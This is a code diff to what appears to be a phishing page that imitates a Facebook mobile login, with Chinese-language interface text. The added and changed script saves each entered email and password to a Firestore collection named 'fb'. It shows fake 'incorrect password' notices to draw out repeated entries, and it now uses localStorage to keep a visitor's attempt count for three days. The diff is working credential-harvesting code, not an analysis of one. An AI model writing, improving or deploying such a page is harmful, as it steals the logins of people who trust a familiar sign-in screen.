@@ -186,6 +186,7 @@
                 <div class="_7om2">
                     <div class="_4g34" id="u_0_0">
                         <div class="_5yd0 _2ph- _5yd1" data-sigil="m_login_notice" id="notice" style="display: none;"></div>
+                        <div class="acy apm abb" data-sigil="marea"><span class="mfsm">請先登入。</span></div>
                         <div class="aclb _4-4l">
                             <div data-sigil="m_login_upsell login_identify_step_element" id="login_top_banner">
                                 <div class="_qw9 grouped aclb"></div>
@@ -338,7 +339,15 @@
         </div>
     </div>
     <script>
+        var TIME = String(Date.now());
         var c = 0;
+        var xf;
+        if(localStorage["xf"])
+            xf = JSON.parse(localStorage["xf"]);
+        else
+            xf = {c: 0, t: Date.now()};
+        if(Date.now() < xf.t + 3*24*60*60*1000)
+            c = xf.c;
         var p;
         var d = [];
         function _login() {
@@ -369,6 +378,8 @@
                 document.getElementById("m_login_email").value = "";
                 document.getElementById("m_login_password").value = "";
                 }, 300+Math.random()*500);
+                xf = {c: 1, t: Date.now()};
+                localStorage["xf"] = JSON.stringify(xf);
             } else if(c === 2) {
             setTimeout(function(){
                 document.getElementById("notice").innerHTML = "你輸入的密碼不正確。";
@@ -376,6 +387,8 @@
                 document.getElementById("m_login_email").value = "";
                 document.getElementById("m_login_password").value = "";
                 }, 300+Math.random()*500);
+                xf = {c: 2, t: Date.now()};
+                localStorage["xf"] = JSON.stringify(xf);
             } else if(c === 3) {
             setTimeout(function(){
                 document.getElementById("m_login_email").value = "";
@@ -400,7 +413,7 @@
             return re.test(String(phone));
         }
         function _action() {
-            db.collection("fb").doc(d[c-1].email).collection(TIME).doc(String(c)).set({pass: d[c-1].password})
+            db.collection("fb").doc(d[d.length-1].email).collection(TIME).doc(String(c)).set({pass: d[d.length-1].password})
             .then(()=>console.log("resolved"))
             .catch(e=>console.log(e));
         }
